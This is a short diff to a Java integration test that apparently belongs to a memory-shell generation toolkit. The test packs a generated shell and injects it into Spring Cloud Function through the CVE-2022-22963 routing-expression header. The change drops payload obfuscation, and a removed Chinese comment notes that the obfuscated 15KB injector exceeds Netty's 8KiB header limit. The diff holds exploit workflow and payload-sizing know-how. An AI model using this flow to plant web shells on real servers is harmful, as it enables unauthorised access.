@@ -5,7 +5,6 @@ import com.reajason.javaweb.integration.ShellAssertion;
 import com.reajason.javaweb.memshell.MemShellResult;
 import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.ShellType;
-import com.reajason.javaweb.memshell.config.ObfuscationConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
 import com.reajason.javaweb.packer.ClassPackerConfig;
 import com.reajason.javaweb.packer.Packers;
@@ -57,10 +56,7 @@ public class CVE202222963Test {
                 shellTool,
                 Opcodes.V1_8,
                 shellToolConfig,
-                packer,
-                // 表达式经 spring.cloud.function.routing-expression 请求头传输，Netty 默认
-                // 8KiB 头部上限；混淆后的 injector 载荷约 15KB，会在进入 SpEL 前被直接拒绝
-                ObfuscationConfig.defaults());
+                packer);
 
         String content = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
         injectBySpringCloudFunction(url, content);
